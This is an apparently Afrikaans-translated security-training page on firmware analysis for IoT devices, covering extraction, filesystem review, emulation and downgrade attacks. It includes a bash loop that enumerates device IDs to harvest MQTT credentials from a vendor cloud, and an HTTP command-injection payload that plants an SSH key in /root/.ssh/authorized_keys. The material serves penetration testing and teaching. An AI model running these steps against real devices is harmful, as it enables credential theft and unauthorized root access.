# Firmware Analise

{{#include ../../banners/hacktricks-training.md}}

## **Inleiding**

### Verwante hulpbronne


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


Firmware is noodsaaklike sagteware wat toestelle toelaat om korrek te funksioneer deur die kommunikasie tussen die hardeware-komponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, wat verseker dat die toestel toegang tot vitale instruksies het vanaf die oomblik dat dit aangeskakel word, wat lei tot die opstart van die bedryfstelsel. Die ondersoek en moontlike wysiging van firmware is 'n kritieke stap in die identifisering van sekuriteitskwesbaarhede.

## **Inligting-insameling**

**Inligting-insameling** is 'n kritieke aanvanklike stap om 'n toestel se samestelling en die tegnologieë wat dit gebruik te verstaan. Hierdie proses behels die versameling van data oor:

- Die CPU-argitektuur en die bedryfstelsel waarop dit loop
- Bootloader-spesifieke besonderhede
- Hardeware-uitleg en datasheets
- Codebase-metrieke en bronlokasies
- Eksterne biblioteke en lisensie-tipes
- Opdateringsgeskiedenis en regulatoriese sertifiseringe
- Argitektoniese en vloei-diagramme
- Sekuriteitsbeoordelings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)**-hulpmiddels van onskatbare waarde, sowel as die ontleding van enige beskikbare open-source sagteware-komponente deur middel van handmatige en geoutomatiseerde hersieningsprosesse. Tools like [Coverity Scan](https://scan.coverity.com) and [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese analise wat benut kan word om potensiële probleme te vind.

## **Verkryging van die Firmware**

Om firmware te bekom kan op verskeie maniere benader word, elk met sy eie vlak van kompleksiteit:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- **Bou** dit vanaf verskafde instruksies
- **Aflaai** vanaf amptelike ondersteuningswebwerwe
- Gebruik **Google dork**-navrae om gehoste firmware-lêers te vind
- Direk toegang tot **cloud storage**, met hulpmiddels soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Afluister van **updates** via man-in-the-middle tegnieke
- **Uittrek** vanaf die toestel deur verbindings soos **UART**, **JTAG**, of **PICit**
- **Sniffing** na update-versoeke binne toestelkommunikasie
- Identifiseer en gebruik **hardcoded update endpoints**
- **Dumping** vanaf die bootloader of netwerk
- **Verwydering en lees** van die stoor-chip, wanneer alles anders faal, met toepaslike hardeware-gereedskap

## Analise van die firmware

Nou dat jy die firmware het, moet jy inligting daaroor uittrek om te weet hoe om dit te hanteer. Verskeie hulpmiddels wat jy hiervoor kan gebruik:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
As jy nie veel met daardie gereedskap vind nie, kontroleer die **entropie** van die image met `binwalk -E <bin>`, as die entropie laag is, is dit nie waarskynlik geënkripteer nie. As die entropie hoog is, is dit waarskynlik geënkripteer (of op een of ander wyse gekomprimeer).

Verder kan jy hierdie gereedskap gebruik om **lêers wat in die firmware ingebed is** te onttrek:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te inspekteer.

### Kry die lêerstelsel

Met die vorige genoemde gereedskap soos `binwalk -ev <bin>` behoort jy in staat te wees om die **lêerstelsel te onttrek**.\
Binwalk onttrek dit gewoonlik binne 'n **gids met die naam van die lêerstelseltipe**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige lêerstelsel-onttrekking

Soms sal binwalk **nie die magic byte van die lêerstelsel in sy signatures hê nie**. In sulke gevalle gebruik binwalk om die **offset van die lêerstelsel te vind en die gekomprimeerde lêerstelsel uit die binêr te carve** en die lêerstelsel **handmatig te onttrek** volgens sy tipe deur die stappe hieronder te volg.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Voer die volgende **dd command** uit om die Squashfs filesystem te carve.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (gebruik in die voorbeeld hierbo)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die `squashfs-root` gids wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware-ontleding

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en moontlike kwesbaarhede te verstaan. Hierdie proses behels die gebruik van verskeie gereedskap om die firmware-beeld te analiseer en waardevolle data daaruit te onttrek.

### Aanvanklike ontledingsgereedskap

'n Stel opdragte word verskaf vir aanvanklike inspeksie van die binêre lêer (verwys na as `<bin>`). Hierdie opdragte help om lêertipes te identifiseer, strings te onttrek, binêre data te ontleed, en die partisies en lêerstelselbesonderhede te verstaan:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Om die enkripsiestatus van die beeld te bepaal, word die **entropie** nagaan met `binwalk -E <bin>`. Lae entropie dui op 'n gebrek aan enkripsie, terwyl hoë entropie moontlike enkripsie of kompressie aandui.

Vir die onttrekking van **ingebedde lêers** word hulpmiddels en bronne soos die **file-data-carving-recovery-tools** dokumentasie en **binvis.io** vir lêerinspeksie aanbeveel.

### Uittrekking van die lêerstelsel

Deur `binwalk -ev <bin>` te gebruik, kan mens gewoonlik die lêerstelsel onttrek, dikwels na 'n gids genoem na die lêerstelseltype (bv. squashfs, ubifs). As **binwalk** egter nie die lêerstelseltype herken nie weens ontbrekende magic bytes, is handmatige uittrekking nodig. Dit behels die gebruik van `binwalk` om die lêerstelsel se offset te bepaal, gevolg deur die `dd` opdrag om die lêerstelsel uit te kerf:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daarna, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs), word verskillende opdragte gebruik om die inhoud handmatig te onttrek.

### Lêerstelsel-analise

Met die lêerstelsel uitgepak begin die soektog na sekuriteitsfoute. Aandag word gegee aan onveilige netwerk-daemons, hardcoded credentials, API endpoints, update server-funksionaliteite, nie-gecompileerde kode, opstartskripte, en gecompileerde binaries vir offline-ontleding.

**Sleutel plekke** en **items** om na te gaan sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikersinloginligting
- SSL-sertifikate en sleutels in **etc/ssl**
- Konfigurasie- en skriplêers vir potensiële kwesbaarhede
- Ingebedde binaries vir verdere ontleding
- Algemene IoT-toestel webservers en binaries

Verskeie gereedskap help om sensitiewe inligting en kwesbaarhede binne die lêerstelsel op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) vir sensitiewe inligtingsoek
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-analise
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitskontroles op gecompileerde binaries

Sowel bronkode as gecompileerde binaries wat in die lêerstelsel gevind word, moet ondersoek word vir kwesbaarhede. Gereedskap soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeskermde binaries te identifiseer wat misbruik kan word.

## Inwinning van cloud-config en MQTT-geloofsbriewe via afgeleide URL-tokens

Baie IoT-hubs haal hul per-toestel konfigurasie vanaf 'n cloud endpoint wat soos volg lyk:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Tydens firmware-analise mag jy vind dat <token> lokaal afgelei word vanaf die device ID met behulp van 'n hardcoded secret, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp maak dit moontlik vir enigiemand wat 'n deviceId en die STATIC_KEY ken om die URL te herkonstruer en die cloud config af te trek, wat dikwels plaintext MQTT-geloofsbriewe en topic-prefikses openbaar.

Praktiese werkvloei:

1) Haal deviceId uit UART boot logs

- Koppel 'n 3.3V UART-adapter (TX/RX/GND) en vang logs op:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Kyk vir reëls wat die cloud config URL-patroon en broker-adres afdruk, byvoorbeeld:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek na die config path ("/pf/") of MD5 usage.
- Bevestig die algoritme (bv., MD5(deviceId||STATIC_KEY)).
- Lei die token af in Bash en maak die digest in hoofletters:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Versamel cloud config en MQTT credentials

- Stel die URL saam en haal JSON met curl; ontleed dit met jq om secrets te onttrek:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Misbruik plaintext MQTT en swak topic ACLs (indien teenwoordig)

- Gebruik herwonne credentials om op maintenance topics in te teken en te soek na gevoelige gebeurtenisse:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumereer voorspelbare toestel-ID's (op skaal, met toestemming)

- Baie ekosisteme inkorporeer vendor OUI/product/type bytes gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's deurloop, tokens aflei en configs programmaties opvraag:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Aantekeninge
- Verkry altyd uitdruklike magtiging voordat jy mass enumeration probeer.
- Gee voorkeur aan emulation of static analysis om geheime te herwin sonder om die teikentoestel se hardware te wysig wanneer moontlik.


Die proses van emulating firmware maak **dynamic analysis** moontlik, hetsy van 'n toestel se werking of van 'n individuele program. Hierdie benadering kan probleme ondervind weens hardware- of architecture-afhanklikhede, maar die oordrag van die root filesystem of spesifieke binaries na 'n toestel met ooreenstemmende architecture en endianness, soos 'n Raspberry Pi, of na 'n voorafgeboude virtual machine, kan verdere toetsing vergemaklik.

### Emulating Individual Binaries

Vir die ondersoek van individuele programme is dit noodsaaklik om die program se endianness en CPU architecture te identifiseer.

#### Voorbeeld met MIPS Architecture

Om 'n MIPS architecture binary te emulateer, kan mens die volgende command gebruik:
```bash
file ./squashfs-root/bin/busybox
```
En om die nodige emulasie-gereedskap te installeer:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian binaries sal `qemu-mipsel` die keuse wees.

#### ARM Argitektuur Emulasie

Vir ARM-binaries is die proses soortgelyk, met die `qemu-arm` emulator wat vir emulasie gebruik word.

### Volledige Stelselemulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), en ander fasiliteer volledige firmware-emulasie, outomatiseer die proses en help by dinamiese ontleding.

## Dinamiese Ontleding in die Praktyk

Op hierdie stadium word óf 'n werklike óf 'n geëmuleerde toestelomgewing gebruik vir ontleding. Dit is noodsaaklik om shell-toegang tot die OS en lêerstelsel te behou. Emulasie mag nie hardware-interaksies perfek naboots nie, wat soms vereis dat emulasie herbegin word. Ontleding moet die lêerstelsel weer besoek, blootgestelde webbladsye en netwerkdienste uitbuit, en bootloader-kwesbaarhede ondersoek. Firmware-integriteitstoetse is krities om potensiële backdoor-kwesbaarhede te identifiseer.

## Runtime-ontledingstegnieke

Runtime-ontleding behels interaksie met 'n proses of binary in sy bedryfsomgewing, deur gereedskap soos gdb-multiarch, Frida en Ghidra te gebruik om breakpoints te stel en kwesbaarhede te identifiseer deur middel van fuzzing en ander tegnieke.

## Binary-uitbuiting en Proof-of-Concept

Om 'n PoC te ontwikkel vir geïdentifiseerde kwesbaarhede vereis 'n diep begrip van die teiken-argitektuur en programmering in laervlak-tale. Binary runtime-beskerming in ingebedde stelsels is skaars, maar wanneer dit voorkom, mag tegnieke soos Return Oriented Programming (ROP) nodig wees.

## Voorbereide Bedryfstelsels vir Firmware-ontleding

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied vooraf-gekonfigureerde omgewings vir firmware-sekuriteitstoetsing, toegerus met die nodige gereedskap.

## Voorbereide OS'e om Firmware te ontleed

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is 'n distro bedoel om jou te help om sekuriteitsassessering en penetration testing van Internet of Things (IoT)-toestelle uit te voer. Dit bespaar jou baie tyd deur 'n vooraf-gekonfigureerde omgewing met al die nodige gereedskap vooraf te laai.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system gebaseer op Ubuntu 18.04, vooraf gelaai met firmware security testing tools.

## Firmware Downgrade-aanvalle & Onveilige Opdateringsmeganismes

Selfs wanneer 'n verskaffer kriptografiese handtekeningkontroles vir firmware-images implementeer, word **version rollback (downgrade) protection dikwels weggelaat**. Wanneer die boot- of recovery-loader slegs die handtekening verifieer met 'n ingebedde publieke sleutel maar nie die *version* (of 'n monotone teller) van die beeld wat geflashed word vergelyk nie, kan 'n aanvaller wettig 'n **ouer, kwesbare firmware installeer wat steeds 'n geldige handtekening dra** en sodoende gepatchte kwesbaarhede herintroduseer.

Tipiese aanvalswerkvloei:

1. **Verkry 'n ouer ondertekende image**
* Haal dit van die verskaffer se openbare aflaaiportaal, CDN of ondersteuningstwerf af.
* Onttrek dit uit begeleidende mobiele/desktop-toepassings (bv. binne 'n Android APK onder `assets/firmware/`).
* Haal dit van derdeparty-berging soos VirusTotal, Internet-argiewe, forums, ens.
2. **Laai die image op of bedien dit aan die toestel** via enige blootgestelde opdateringskanaal:
* Web UI, mobile-app API, USB, TFTP, MQTT, ens.
* Baie verbruikers-IoT-toestelle bied *unauthenticated* HTTP(S)-endpunte aan wat Base64-gekodeerde firmware-blobs aanvaar, dit server-side dekodeer en recovery/upgrade aktiveer.
3. Na die downgrade, benut 'n kwesbaarheid wat in die nuwer vrystelling gepatch is (byvoorbeeld 'n command-injection-filter wat later bygevoeg is).
4. Opsioneel flash die nuutste image terug of sluit opdaterings af om opsporing te vermy sodra persistensie bereik is.

### Voorbeeld: Command Injection Na Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In die kwesbare (gedowngrade) firmware word die `md5`-parameter direk in 'n shell-opdrag saamgevoeg sonder sanitisering, wat die inspuiting van ewekansige opdragte toelaat (hier – om SSH-sleutelgebaseerde root-toegang te aktiveer). Later firmwareweergawes het 'n basiese karakterfilter bekendgestel, maar die afwesigheid van downgrade-beskerming maak die herstel sinloos.

### Uittrekking van Firmware uit Mobile Apps

Baie verskaffers pak volledige firmware-images saam binne hul begeleidende mobiele toepassings sodat die app die toestel oor Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word algemeen onversleuteld gestoor in die APK/APEX onder paaie soos `assets/fw/` of `res/raw/`. Gereedskap soos `apktool`, `ghidra`, of selfs net `unzip` laat jou toe om ondertekende images te onttrek sonder om die fisiese hardeware aan te raak.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Kontrolelys vir die beoordeling van opdateringslogika

* Is die transport/authentication van die *update endpoint* voldoende beskerm (TLS + authentication)?
* Vergelyk die toestel **version numbers** of 'n **monotonic anti-rollback counter** voordat dit geflasht word?
* Word die image binne 'n secure boot chain geverifieer (bv. signatures deur ROM code nagegaan)?
* Voer userland code bykomende sanity checks uit (bv. allowed partition map, model number)?
* Herbruik *partial* of *backup* update flows dieselfde validasie-logika?

> 💡  As enige van bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Vulnerable firmware to practice

To practice discovering vulnerabilities in firmware, use the following vulnerable firmware projects as a starting point.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Verwysings

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
